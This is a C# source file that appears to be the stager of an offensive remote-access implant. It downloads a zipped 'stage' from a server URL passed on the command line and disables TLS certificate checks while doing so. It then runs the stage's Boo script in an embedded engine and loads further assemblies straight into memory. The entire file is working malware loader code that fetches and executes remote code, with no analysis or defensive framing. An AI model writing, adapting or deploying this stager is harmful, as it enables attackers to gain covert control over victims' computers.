using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Kaliya.Utils;

namespace Kaliya
{
    [ComVisible(true)]
    public static class ST
    {
        private static ZipStorer _stage;

        static ST()
        {
            ServicePointManager.ServerCertificateValidationCallback +=
                (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType) 768 |
                                                   (SecurityProtocolType) 3072;
            ServicePointManager.Expect100Continue = false;

            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
        }

        public static void Main(string[] args)
        {
            var guid = Guid.NewGuid();
            var baseUrl = new Uri(args[0]);
            var url = new Uri(new Uri(args[0]), guid.ToString());

#if DEBUG
            Console.WriteLine("[+] URL: {0}", url);
#endif

            _stage = ZipStorer.Open(Core.DownloadStage(url), FileAccess.ReadWrite, true);
            var resource = Resources.GetResourceInZip(_stage, "Main.boo");
            var source = Encoding.UTF8.GetString(resource, 0, resource.Length);

            Engine.Boo.Run(source, guid.ToString(), baseUrl.ToString());
        }

        private static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
        {
            var dll = Extras.GetDllName(args.Name);
            byte[] bytes;
            try
            {
                bytes = Resources.GetByName(dll);
            }
            catch
            {
                bytes = Resources.GetResourceInZip(_stage, dll) ??
                        File.ReadAllBytes($"{RuntimeEnvironment.GetRuntimeDirectory()}{dll}");
            }

            return Assembly.Load(bytes);
        }
    }
}